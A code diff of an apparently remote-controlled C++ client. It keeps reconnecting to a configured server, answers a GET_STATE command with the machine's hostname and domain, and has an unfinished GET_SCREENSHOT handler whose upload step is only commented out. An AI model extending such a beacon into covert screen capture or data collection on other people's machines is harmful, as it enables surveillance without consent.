@@ -137,39 +137,45 @@ int main() {
     string screenshot_dir = conf["screenshot_dir"];
     string host_name = getPCName();
     string host_domain_name = getPCDomain();
+    if (host_domain_name.length() == 0) {
+        host_domain_name = "no domain";
+    }
 
 
-    try {
-        TCPClient client(server_ip, server_port);
-        client.connect();
+    while (true) {
+
+        TCPClient* client = new TCPClient(server_ip, server_port);
+        client->connect();
 
         while (true) {
-            string command = client.receiveMessage();
-            cout << command << endl;
-            continue;
+            try {
+                string command = client->receiveMessage();
+                cout << command << endl;
 
-            if (command == "SCREENSHOT") {
-                wstring screen_path = screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));
-                // перевести bmp файл в тектс (string), отправить кусками на сервер
-                //client.sendMessage("SCREENSHOT START");
-                //vector<string> fileParts = ...;
-                //for (auto fp : fileParts) {
-                //    client.sendMessage(fp);
-                //}
-                //client.sendMessage("SCREENSHOT END");
+                if (command == "GET_SCREENSHOT") {
+                    wstring screen_path = screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));
+                    // перевести bmp файл в тектс (string), отправить кусками на сервер
+                    //client.sendMessage("SCREENSHOT START");
+                    //vector<string> fileParts = ...;
+                    //for (auto fp : fileParts) {
+                    //    client.sendMessage(fp);
+                    //}
+                    //client.sendMessage("SCREENSHOT END");
+                }
+                else if (command == "GET_STATE") {
+                    string info = "";
+                    info += "hostname: " + host_name + "\n";
+                    info += "domain: " + host_domain_name + "\n";
+                    client->sendMessage("STATE START");
+                    client->sendMessage(info);
+                    client->sendMessage("STATE END");
+                }
             }
-            else if (command == "INFO") {
-                string info = "";
-                info += "hostname: " + host_name + "\n";
-                info += "domain" + host_domain_name + "\n";
-                client.sendMessage("INFO START");
-                client.sendMessage(info);
-                client.sendMessage("INFO END");
+            catch (const std::exception& e) {
+                delete client;
+                break;
             }
-        }        
-    }
-    catch (const std::exception& e) {
-        return 1;
-    }
+        }
 
+    }
 }
